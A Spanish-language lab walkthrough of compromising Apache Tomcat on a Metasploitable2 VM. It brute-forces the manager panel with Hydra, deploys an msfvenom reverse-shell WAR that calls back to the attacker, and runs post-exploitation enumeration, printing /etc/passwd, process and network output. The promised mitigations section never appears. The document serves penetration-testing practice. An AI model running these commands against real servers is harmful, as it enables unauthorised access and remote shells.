# 📌 Apache Tomcat/Coyote JSP (8180):

- Permite practicar explotación de panel de administración web.
- Podemos cubrir técnicas de búsqueda de credenciales por defecto.
- Muy útil para aprender sobre WAR file deployment para obtener una reverse shell.
- No es un exploit directo como vsftpd, sino que requiere enumeración, fuerza bruta, acceso y carga de payload → más realista.
- Permite documentar un ataque web + post-explotación en Linux.

- El laboratorio quedaría:

  1. Detección del servicio y versión.
  2. Acceso al panel de administración.
  3. Fuerza bruta de credenciales por defecto.
  4. Creación y despliegue de un **WAR malicioso.**
  5. Obtención de reverse shell.
  6. Enumeración del sistema comprometido.
  7. Mitigaciones y conclusiones.

## 🧠 Objetivo del laboratorio (Apache Tomcat – Puerto 8180)

Vamos a detectar, enumerar y explotar una instancia de Apache Tomcat expuesta. Nuestro objetivo es obtener una reverse shell desplegando un archivo WAR malicioso a través del Manager App.

## 🧩 ¿Qué es Apache Tomcat?

Apache Tomcat es un servidor web y contenedor de servlets Java que permite ejecutar aplicaciones web desarrolladas en Java.
Su panel de administración (/manager/html) permite gestionar y desplegar aplicaciones.
Cuando está mal configurado (credenciales por defecto o expuesto públicamente), un atacante puede subir y ejecutar código malicioso en el servidor.

## 🎯 Fases del ataque

1. Detección del servicio.
2. Acceso al panel de administración.
3. Búsqueda y prueba de credenciales por defecto.
4. Generación de un payload WAR malicioso.
5. Carga del payload y ejecución.
6. Obtención de reverse shell.
7. Enumeración post-explotación.
8. Mitigaciones.

## 🔍 Paso 1: Escaneo con Nmap

Ejecutamos un escaneo para identificar el servicio y la versión.

```bash
nmap -sV -p 8180 192.168.56.102
```

📌 Resultado:

```arduino
8180/tcp open  http  Apache Tomcat/Coyote JSP engine 1.1
```

Confirmamos que Apache Tomcat está activo en el puerto 8180.

## 🌐 Paso 2: Acceso al panel de administración

Abrimos el navegador y accedemos a:

```cpp
http://192.168.56.102:8180
```

Vamos a la página por defecto de Tomcat, que suele tener enlaces como:

- /manager/html -> Panel de administración.
- /host-manager/html -> Gestión de hosts virtuales.

## 🗝️ Paso 3: Credenciales por defecto

Apache Tomcat suele instalarse con credenciales por defecto como:

Usuario	Contraseña
admin	admin
admin	password
tomcat	tomcat
manager	manager
role1	role1

Probamos manualmente en /manager/html.

Si no funcionan, utilizamos la herramienta **Hydra**:

```bash
hydra -l tomcat -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-get /manager/html
```

📌 En Metasploitable2, las credenciales por defecto suelen ser:

```yami
tomcat: tomcat
```

## 💣 Paso 4: Generar el payload WAR

Usamos 'msfvenom' para crear un archivo WAR que, al ser desplegado, nos dé una shell inversa:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war -o shell.war
```
- **LHOST:** IP del atacante (Kali).
- **LPORT:** Puerto donde escucharemos la conexión.
- **Formato WAR:** Compatible con despliegue en Tomcat.

## 📤 Paso 5: Cargar el payload

1. Accedemos a /manager/html.
2. En la sección **WAR file to deploy**, seleccionamos shell.war.
3. Hacemos clic en **Deploy**.

## 📞 Paso 6: Obtener reverse shell

En otra terminal, ponemos a escuchar Netcat:

```bash
nc -lvnp 4444
```

Luego accedemos en el navegador a:

```arduino
http://192.168.56.102:8180/shell/
```

💥 Aparece conexión en nuestra terminal que tenemos en escucha:

```css
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 12345
```

¡Listo, ya tenemos acceso al sistema!.

## 🔎 Paso 7: Enumeración post-explotación

Una vez dentro:

```bash
whoami
```

**Resultado de usuario actual:**

tomcat

```bash
uname -a
```

**Resultado del sistema:**

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

```bash
cat /etc/issue
```

**Resultado del sistema:**

 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com


```bash
id
```

**Resultado de usuario:**

uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)

```bash
ls /home
```

**Resultado listado de home:**

ftp  javi3r  msfadmin  pentester  service  user

```bash
cat /etc/passwd
```

**Resultado de contraseñas:**

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
javi3r:x:1003:1003::/home/javi3r:/bin/bash
pentester:x:1004:1004::/home/pentester:/bin/bash
tomcat55@metasploitable:/$ 

```bash
ps aux
```

**Resultado de los procesos:**

USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   2844  1692 ?        Ss   10:58   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S<   10:58   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S<   10:58   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S<   10:58   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   10:58   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S<   10:58   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S<   10:58   0:00 [khelper]
root        41  0.0  0.0      0     0 ?        S<   10:58   0:00 [kblockd/0]
root        44  0.0  0.0      0     0 ?        S<   10:58   0:00 [kacpid]
root        45  0.0  0.0      0     0 ?        S<   10:58   0:00 [kacpi_notify]
root        90  0.0  0.0      0     0 ?        S<   10:58   0:00 [kseriod]
root       128  0.0  0.0      0     0 ?        S    10:58   0:00 [pdflush]
root       129  0.0  0.0      0     0 ?        S    10:58   0:00 [pdflush]
root       130  0.0  0.0      0     0 ?        S<   10:58   0:00 [kswapd0]
root       172  0.0  0.0      0     0 ?        S<   10:58   0:00 [aio/0]
root      1128  0.0  0.0      0     0 ?        S<   10:58   0:00 [ksnapd]
root      1295  0.0  0.0      0     0 ?        S<   10:58   0:00 [ata/0]
root      1298  0.0  0.0      0     0 ?        S<   10:58   0:00 [ata_aux]
root      1307  0.0  0.0      0     0 ?        S<   10:58   0:00 [scsi_eh_0]
root      1310  0.0  0.0      0     0 ?        S<   10:58   0:00 [scsi_eh_1]
root      1327  0.0  0.0      0     0 ?        S<   10:58   0:00 [ksuspend_usbd]
root      1330  0.0  0.0      0     0 ?        S<   10:58   0:00 [khubd]
root      2058  0.0  0.0      0     0 ?        S<   10:58   0:00 [scsi_eh_2]
root      2257  0.0  0.0      0     0 ?        S<   10:58   0:00 [kjournald]
root      2411  0.0  0.0   2092   612 ?        S<s  10:58   0:00 /sbin/udevd --d
root      2619  0.0  0.0      0     0 ?        S<   10:58   0:00 [kpsmoused]
dhcp      3382  0.0  0.0   2436   768 ?        S<s  10:58   0:00 dhclient3 -e IF
root      3599  0.0  0.0      0     0 ?        S<   10:58   0:00 [kjournald]
daemon    3729  0.0  0.0   1836   584 ?        Ss   10:58   0:00 /sbin/portmap
statd     3745  0.0  0.0   1900   724 ?        Ss   10:58   0:00 /sbin/rpc.statd
root      3751  0.0  0.0      0     0 ?        S<   10:58   0:00 [rpciod/0]
root      3766  0.0  0.0   3648   564 ?        Ss   10:58   0:00 /usr/sbin/rpc.i
root      3993  0.0  0.0   1716   484 tty4     Ss+  10:58   0:00 /sbin/getty 384
root      3994  0.0  0.0   1716   492 tty5     Ss+  10:58   0:00 /sbin/getty 384
root      3999  0.0  0.0   1716   484 tty2     Ss+  10:58   0:00 /sbin/getty 384
root      4001  0.0  0.0   1716   492 tty3     Ss+  10:58   0:00 /sbin/getty 384
root      4004  0.0  0.0   1716   492 tty6     Ss+  10:58   0:00 /sbin/getty 384
syslog    4042  0.0  0.0   1936   644 ?        Ss   10:58   0:00 /sbin/syslogd -
root      4077  0.0  0.0   1872   544 ?        S    10:58   0:00 /bin/dd bs 1 if
klog      4079  0.0  0.2   3284  2144 ?        Ss   10:58   0:00 /sbin/klogd -P
bind      4102  0.0  0.7  35668  8008 ?        Ssl  10:58   0:00 /usr/sbin/named
root      4124  0.0  0.0   5312  1032 ?        Ss   10:58   0:00 /usr/sbin/sshd
root      4200  0.0  0.1   2768  1304 ?        S    10:58   0:00 /bin/sh /usr/bi
mysql     4242  0.0  1.6 127660 17160 ?        Sl   10:58   0:00 /usr/sbin/mysql
root      4244  0.0  0.0   1700   556 ?        S    10:58   0:00 logger -p daemo
postgres  4321  0.0  0.4  41340  5068 ?        S    10:58   0:00 /usr/lib/postgr
postgres  4325  0.0  0.1  41340  1376 ?        Ss   10:58   0:00 postgres: write
postgres  4326  0.0  0.1  41340  1188 ?        Ss   10:58   0:00 postgres: wal w
postgres  4327  0.0  0.1  41340  1380 ?        Ss   10:58   0:00 postgres: autov
postgres  4328  0.0  0.1  12660  1128 ?        Ss   10:58   0:00 postgres: stats
daemon    4347  0.0  0.0   2316   420 ?        SNs  10:58   0:00 distccd --daemo
daemon    4348  0.0  0.0   2316   212 ?        SN   10:58   0:00 distccd --daemo
root      4397  0.0  0.0      0     0 ?        S    10:58   0:00 [lockd]
root      4398  0.0  0.0      0     0 ?        S<   10:58   0:00 [nfsd4]
root      4399  0.0  0.0      0     0 ?        S    10:58   0:00 [nfsd]
root      4400  0.0  0.0      0     0 ?        S    10:58   0:00 [nfsd]
root      4401  0.0  0.0      0     0 ?        S    10:58   0:00 [nfsd]
root      4402  0.0  0.0      0     0 ?        S    10:58   0:00 [nfsd]
root      4403  0.0  0.0      0     0 ?        S    10:58   0:00 [nfsd]
root      4404  0.0  0.0      0     0 ?        S    10:58   0:00 [nfsd]
root      4405  0.0  0.0      0     0 ?        S    10:58   0:00 [nfsd]
root      4406  0.0  0.0      0     0 ?        S    10:58   0:00 [nfsd]
root      4410  0.0  0.0   2424   332 ?        Ss   10:58   0:00 /usr/sbin/rpc.m
root      4476  0.0  0.1   5412  1728 ?        Ss   10:58   0:00 /usr/lib/postfi
postfix   4480  0.0  0.1   5460  1796 ?        S    10:58   0:00 qmgr -l -t fifo
root      4483  0.0  0.1   5388  1204 ?        Ss   10:58   0:00 /usr/sbin/nmbd
root      4485  0.0  0.1   7724  1404 ?        Ss   10:58   0:00 /usr/sbin/smbd
root      4490  0.0  0.0   7724   812 ?        S    10:58   0:00 /usr/sbin/smbd
root      4501  0.0  0.0   2424   868 ?        Ss   10:58   0:00 /usr/sbin/xinet
proftpd   4540  0.0  0.1   9948  1608 ?        Ss   10:58   0:00 proftpd: (accep
daemon    4554  0.0  0.0   1984   420 ?        Ss   10:58   0:00 /usr/sbin/atd
root      4565  0.0  0.0   2104   896 ?        Ss   10:58   0:00 /usr/sbin/cron
root      4593  0.0  0.0   2052   352 ?        Ss   10:58   0:00 /usr/bin/jsvc -
root      4594  0.0  0.0   2052   480 ?        S    10:58   0:00 /usr/bin/jsvc -
tomcat55  4596  0.3 14.5 462760 150504 ?       Sl   10:58   0:13 /usr/bin/jsvc -
root      4614  0.0  0.2  10596  2560 ?        Ss   10:58   0:00 /usr/sbin/apach
www-data  4615  0.0  0.2  10732  2492 ?        S    10:58   0:00 /usr/sbin/apach
www-data  4616  0.0  0.2  10596  2440 ?        S    10:58   0:00 /usr/sbin/apach
www-data  4618  0.0  0.2  10732  2488 ?        S    10:58   0:00 /usr/sbin/apach
www-data  4622  0.0  0.2  10596  2448 ?        S    10:58   0:00 /usr/sbin/apach
www-data  4625  0.0  0.2  10732  2488 ?        S    10:58   0:00 /usr/sbin/apach
root      4633  0.0  2.5  74540 26552 ?        Sl   10:58   0:00 /usr/bin/rmireg
root      4638  0.0  0.2  12208  2544 ?        Sl   10:58   0:00 ruby /usr/sbin/
root      4639  0.0  0.2   8540  2496 ?        S    10:58   0:00 /usr/bin/unreal
root      4652  0.0  0.1   2568  1204 tty1     Ss   10:58   0:00 /bin/login -- 
root      4655  0.0  1.1  13924 12028 ?        S    10:58   0:00 Xtightvnc :0 -d
daemon    4657  0.0  0.0   2316   212 ?        SN   10:58   0:00 distccd --daemo
daemon    4662  0.0  0.0   2316   212 ?        SN   10:58   0:00 distccd --daemo
root      4665  0.0  0.1   2724  1192 ?        S    10:58   0:00 /bin/sh /root/.
root      4668  0.0  0.2   5936  2572 ?        S    10:58   0:00 xterm -geometry
root      4670  0.0  0.4   8988  4996 ?        S    10:58   0:00 fluxbox
root      4692  0.0  0.1   2852  1548 pts/0    Ss+  10:58   0:00 -bash
msfadmin  4749  0.0  0.1   4616  1976 tty1     S+   10:58   0:00 -bash
postfix   4755  0.0  0.1   5492  1788 ?        S    10:59   0:00 cleanup -z -t u
postfix   4757  0.0  0.2   5612  2292 ?        S    10:59   0:00 local -t unix
postfix   4817  0.0  0.2   5788  2444 ?        S    11:05   0:00 tlsmgr -l -t un
www-data  4838  0.0  0.2  10596  2416 ?        S    11:05   0:00 /usr/sbin/apach
www-data  4997  0.0  0.2  10596  2408 ?        S    11:22   0:00 /usr/sbin/apach
tomcat55  5119  0.0  0.1   4492  1604 ?        S    11:37   0:00 /bin/sh
tomcat55  5213  0.0  0.2   4244  2528 ?        R    11:46   0:00 python -c impor
tomcat55  5214  0.0  0.1   4620  1980 pts/1    Rs   11:46   0:00 /bin/bash
postfix   5235  0.0  0.1   5420  1712 ?        S    11:48   0:00 pickup -l -t fi
tomcat55  5289  0.0  0.0   2644  1008 pts/1    R+   11:54   0:00 ps aux
Buscamos privilegios elevados, contraseñas, configuraciones sensibles.

```bash
ip a
```

**Resultado de ip:**

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 08:00:27:63:dc:ba brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.102/24 brd 192.168.56.255 scope global eth0
    inet6 fe80::a00:27ff:fe63:dcba/64 scope link 
       valid_lft forever preferred_lft forever

```bash
netstat -tulnp
```

**Resultado de red:**

(No info could be read for "-p": geteuid()=110 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:35044           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:44010           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:1099            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:40467           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:8787            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:8180            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:40756           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.56.102:53       0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::2121                 :::*                    LISTEN      -               
tcp6       0      0 :::3632                 :::*                    LISTEN      -               
tcp6       0      0 :::53                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::5432                 :::*                    LISTEN      -               
tcp6       0      0 ::1:953                 :::*                    LISTEN      -               
udp        0      0 0.0.0.0:2049            0.0.0.0:*                           -               
udp        0      0 192.168.56.102:137      0.0.0.0:*                           -               
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -               
udp        0      0 192.168.56.102:138      0.0.0.0:*                           -               
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:45357           0.0.0.0:*                           -               
udp        0      0 192.168.56.102:53       0.0.0.0:*                           -               
udp        0      0 127.0.0.1:53            0.0.0.0:*                           -               
udp        0      0 0.0.0.0:33078           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:953             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:69              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:40557           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:47090           0.0.0.0:*                           -               
udp6       0      0 :::53                   :::*                                -               
udp6       0      0 :::58450                :::*                                -   

```bash
find / -type f \( -name "*.conf" -o -name "*.xml" \) 2>/dev/null
````

**Resultado de configuración sensible del sistema:**

/usr/share/mysql/mysql-test/std_data/Index.xml
/usr/share/mysql/charsets/keybcs2.xml
/usr/share/mysql/charsets/cp866.xml
/usr/share/mysql/charsets/cp852.xml
/usr/share/mysql/charsets/Index.xml
/usr/share/mysql/charsets/cp1256.xml
/usr/share/mysql/charsets/greek.xml
/usr/share/mysql/charsets/latin5.xml
/usr/share/mysql/charsets/latin2.xml
/usr/share/mysql/charsets/dec8.xml
/usr/share/mysql/charsets/ascii.xml
/usr/share/mysql/charsets/geostd8.xml
/usr/share/mysql/charsets/cp1251.xml
/usr/share/mysql/charsets/hebrew.xml
/usr/share/mysql/charsets/hp8.xml
/usr/share/mysql/charsets/macroman.xml
/usr/share/mysql/charsets/latin7.xml
/usr/share/mysql/charsets/koi8u.xml
/usr/share/mysql/charsets/swe7.xml
/usr/share/mysql/charsets/cp1250.xml
/usr/share/mysql/charsets/macce.xml
/usr/share/mysql/charsets/armscii8.xml
/usr/share/mysql/charsets/latin1.xml
/usr/share/mysql/charsets/koi8r.xml
/usr/share/mysql/charsets/cp850.xml
/usr/share/mysql/charsets/cp1257.xml
/usr/share/alsa/alsa.conf
/usr/share/alsa/smixer.conf
/usr/share/alsa/pcm/dsnoop.conf
/usr/share/alsa/pcm/surround51.conf
/usr/share/alsa/pcm/default.conf
/usr/share/alsa/pcm/iec958.conf
/usr/share/alsa/pcm/front.conf
/usr/share/alsa/pcm/surround41.conf
/usr/share/alsa/pcm/surround71.conf
/usr/share/alsa/pcm/dpl.conf
/usr/share/alsa/pcm/modem.conf
/usr/share/alsa/pcm/surround50.conf
/usr/share/alsa/pcm/side.conf
/usr/share/alsa/pcm/surround40.conf
/usr/share/alsa/pcm/center_lfe.conf
/usr/share/alsa/pcm/rear.conf
/usr/share/alsa/pcm/dmix.conf
/usr/share/alsa/cards/RME9652.conf
/usr/share/alsa/cards/HDA-Intel.conf
/usr/share/alsa/cards/ICE1712.conf
/usr/share/alsa/cards/VIA686A.conf
/usr/share/alsa/cards/VIA8237.conf
/usr/share/alsa/cards/Aureon51.conf
/usr/share/alsa/cards/VXPocket440.conf
/usr/share/alsa/cards/EMU10K1.conf
/usr/share/alsa/cards/Maestro3.conf
/usr/share/alsa/cards/ICE1724.conf
/usr/share/alsa/cards/CA0106.conf
/usr/share/alsa/cards/CS46xx.conf
/usr/share/alsa/cards/CMI8788.conf
/usr/share/alsa/cards/ICH4.conf
/usr/share/alsa/cards/PC-Speaker.conf
/usr/share/alsa/cards/VIA8233A.conf
/usr/share/alsa/cards/TRID4DWAVENX.conf
/usr/share/alsa/cards/CMI8738-MC6.conf
/usr/share/alsa/cards/USB-Audio.conf
/usr/share/alsa/cards/YMF744.conf
/usr/share/alsa/cards/ENS1371.conf
/usr/share/alsa/cards/VXPocket.conf
/usr/share/alsa/cards/PMac.conf
/usr/share/alsa/cards/NFORCE.conf
/usr/share/alsa/cards/EMU10K1X.conf
/usr/share/alsa/cards/AU8820.conf
/usr/share/alsa/cards/ICH-MODEM.conf
/usr/share/alsa/cards/RME9636.conf
/usr/share/alsa/cards/AU8810.conf
/usr/share/alsa/cards/ES1968.conf
/usr/share/alsa/cards/CMI8338.conf
/usr/share/alsa/cards/Aureon71.conf
/usr/share/alsa/cards/PMacToonie.conf
/usr/share/alsa/cards/Audigy.conf
/usr/share/alsa/cards/AU8830.conf
/usr/share/alsa/cards/PS3.conf
/usr/share/alsa/cards/CMI8338-SWIEC.conf
/usr/share/alsa/cards/ENS1370.conf
/usr/share/alsa/cards/VIA8233.conf
/usr/share/alsa/cards/ATIIXP.conf
/usr/share/alsa/cards/aliases.conf
/usr/share/alsa/cards/CMI8738-MC8.conf
/usr/share/alsa/cards/ATIIXP-SPDMA.conf
/usr/share/alsa/cards/SI7018.conf
/usr/share/alsa/cards/GUS.conf
/usr/share/alsa/cards/ICH.conf
/usr/share/alsa/cards/Audigy2.conf
/usr/share/alsa/cards/FM801.conf
/usr/share/alsa/cards/ATIIXP-MODEM.conf
/usr/share/alsa/cards/AACI.conf
/usr/share/alsa/cards/VX222.conf
/usr/share/filezilla/resources/blukis/theme.xml
/usr/share/filezilla/resources/theme.xml
/usr/share/filezilla/resources/cyril/theme.xml
/usr/share/filezilla/resources/defaultfilters.xml
/usr/share/struts1.2/validator-rules.xml
/usr/share/base-files/nsswitch.conf
/usr/share/nfs-common/conffiles/idmapd.conf
/usr/share/samba/smb.conf
/usr/share/tomcat5.5-webapps/servlets-examples.xml
/usr/share/tomcat5.5-webapps/jsp-examples.xml
/usr/share/tomcat5.5-webapps/tomcat-docs.xml
/usr/share/tomcat5.5-webapps/balancer.xml
/usr/share/tomcat5.5-webapps/webdav.xml
/usr/share/tomcat5.5-webapps/servlets-examples/WEB-INF/web.xml
/usr/share/tomcat5.5-webapps/webdav/WEB-INF/web.xml
/usr/share/tomcat5.5-webapps/tomcat-docs/build.xml
/usr/share/tomcat5.5-webapps/tomcat-docs/appdev/sample/build.xml
/usr/share/tomcat5.5-webapps/tomcat-docs/appdev/sample/web/WEB-INF/web.xml
/usr/share/tomcat5.5-webapps/tomcat-docs/WEB-INF/web.xml
/usr/share/tomcat5.5-webapps/balancer/META-INF/context.xml
/usr/share/tomcat5.5-webapps/balancer/WEB-INF/web.xml
/usr/share/tomcat5.5-webapps/balancer/WEB-INF/config/rules.xml
/usr/share/tomcat5.5-webapps/ROOT/WEB-INF/web.xml
/usr/share/tomcat5.5-webapps/jsp-examples/WEB-INF/web.xml
/usr/share/tomcat5.5-webapps/ROOT.xml
/usr/share/popularity-contest/default.conf
/usr/share/tomcat5.5/bin/jkstatus-tasks.xml
/usr/share/tomcat5.5/bin/catalina-tasks.xml
/usr/share/tomcat5.5/bin/jmxaccessor-tasks.xml
/usr/share/tomcat5.5/server/webapps/host-manager/host-manager.xml
/usr/share/tomcat5.5/server/webapps/host-manager/manager.xml
/usr/share/tomcat5.5/server/webapps/host-manager/WEB-INF/web.xml
/usr/share/tomcat5.5/server/webapps/admin/admin.xml
/usr/share/tomcat5.5/server/webapps/admin/WEB-INF/struts-config.xml
/usr/share/tomcat5.5/server/webapps/admin/WEB-INF/web.xml
/usr/share/tomcat5.5/server/webapps/manager/manager.xml
/usr/share/tomcat5.5/server/webapps/manager/WEB-INF/web.xml
/usr/share/debconf/debconf.conf
/usr/share/proftpd/templates/proftpd.conf
/usr/share/proftpd/templates/sql.conf
/usr/share/proftpd/templates/tls.conf
/usr/share/proftpd/templates/modules.conf
/usr/share/proftpd/templates/ldap.conf
/usr/share/adduser/adduser.conf
/usr/share/ufw/ufw.conf
/usr/share/doc/libcupsys2/examples/client.conf
/usr/share/doc/libxml-parser-perl/examples/canontst.xml
/usr/share/doc/wpasupplicant/examples/wpa2-eap-ccmp.conf
/usr/share/doc/wpasupplicant/examples/plaintext.conf
/usr/share/doc/wpasupplicant/examples/wep.conf
/usr/share/doc/wpasupplicant/examples/wpa-psk-tkip.conf
/usr/share/doc/wpasupplicant/examples/ieee8021x.conf
/usr/share/doc/apache2.2-common/examples/apache2/extra/httpd-vhosts.conf
/usr/share/doc/apache2.2-common/examples/apache2/extra/httpd-default.conf
/usr/share/doc/apache2.2-common/examples/apache2/extra/httpd-manual.conf
/usr/share/doc/apache2.2-common/examples/apache2/extra/httpd-userdir.conf
/usr/share/doc/apache2.2-common/examples/apache2/extra/httpd-autoindex.conf
/usr/share/doc/apache2.2-common/examples/apache2/extra/httpd-info.conf
/usr/share/doc/apache2.2-common/examples/apache2/extra/httpd-dav.conf
/usr/share/doc/apache2.2-common/examples/apache2/extra/httpd-mpm.conf
/usr/share/doc/apache2.2-common/examples/apache2/extra/httpd-multilang-errordoc.conf
/usr/share/doc/libcommons-launcher-java/examples/bin/launcher.xml
/usr/share/doc/libcommons-launcher-java/examples/launcher.xml
/usr/share/doc/libcommons-launcher-java/examples/example/src/bin/launcher.xml
/usr/share/doc/libcommons-launcher-java/examples/example/src/etc/log4j.xml
/usr/share/doc/apt/examples/apt.conf
/usr/share/doc/adduser/examples/adduser.local.conf
/usr/share/doc/adduser/examples/adduser.local.conf.examples/adduser.conf
/usr/share/doc/apt-utils/examples/apt-ftparchive.conf
/usr/share/doc/memtest86+/examples/lilo.conf
/usr/share/doc/procps/examples/sysctl.conf
/usr/share/doc/rsync/examples/rsyncd.conf
/usr/share/X11/xkb/rules/sun.xml
/usr/lib/firefox-3.6.17/blocklist.xml
/usr/lib/firefox-addons/searchplugins/en-US/wikipedia.xml
/usr/lib/firefox-addons/searchplugins/en-US/answers.xml
/usr/lib/firefox-addons/searchplugins/en-US/eBay.xml
/usr/lib/firefox-addons/searchplugins/en-US/amazondotcom.xml
/usr/lib/firefox-addons/searchplugins/en-US/yahoo.xml
/usr/lib/firefox-addons/searchplugins/en-US/creativecommons.xml
/usr/lib/firefox-addons/searchplugins/en-US/google.xml
/usr/lib/python2.5/doc/tools/sgmlconv/conversion.xml
/root/.gstreamer-0.10/registry.i486.xml
/etc/pam.conf
/etc/gssapi_mech.conf
/etc/depmod.d/ubuntu.conf
/etc/fuse.conf
/etc/gconf/2/evoldap.conf
/etc/gconf/gconf.xml.defaults/%gconf-tree.xml
/etc/gconf/gconf.xml.mandatory/%gconf-tree.xml
/etc/sysctl.conf
/etc/gai.conf
/etc/postgresql-common/autovacuum.conf
/etc/vsftpd.conf
/etc/adduser.conf
/etc/debconf.conf
/etc/ld.so.conf.d/libc.conf
/etc/ld.so.conf.d/i486-linux-gnu.conf
/etc/belocs/locale-gen.conf
/etc/apparmor/logprof.conf
/etc/apparmor/subdomain.conf
/etc/samba/smb.conf
/etc/host.conf
/etc/ltrace.conf
/etc/hesiod.conf
/etc/lvm/lvm.conf
/etc/ld.so.conf
/etc/ldap/ldap.conf
/etc/logrotate.conf
/etc/purple/prefs.xml
/etc/tomcat5.5/server.xml
